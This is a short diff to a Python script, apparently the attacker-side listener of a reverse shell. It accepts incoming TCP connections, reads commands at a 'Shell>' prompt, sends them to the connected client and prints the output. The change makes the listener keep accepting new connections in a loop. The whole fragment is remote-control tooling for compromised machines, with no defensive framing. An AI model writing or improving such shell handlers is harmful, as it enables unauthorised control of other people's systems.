@@ -11,21 +11,21 @@ def connect():
 
     print("[+] Listening for incoming TCP connection on port ", port)
 
-    conn, addr = sock.accept()
+    while 1:    
+        conn, addr = sock.accept()
+        print("Connection from: ", addr)
+        
+        while 1:
+            command = input("Shell> ")
 
-    print("Connection from: ", addr)
-
-    while 1:
-        command = input("Shell> ")
-
-        if "terminate" in command:
-            conn.send("terminate")
-            conn.close()
-        else:
-            # send command to client
-            conn.send(command.encode())
-            # print response
-            print(conn.recv(1024).decode("utf-8") )
+            if "terminate" in command:
+                conn.send("terminate")
+                conn.close()
+            else:
+                # send command to client
+                conn.send(command.encode())
+                # print response
+                print(conn.recv(1024).decode("utf-8") )
 
 def main():
     connect()
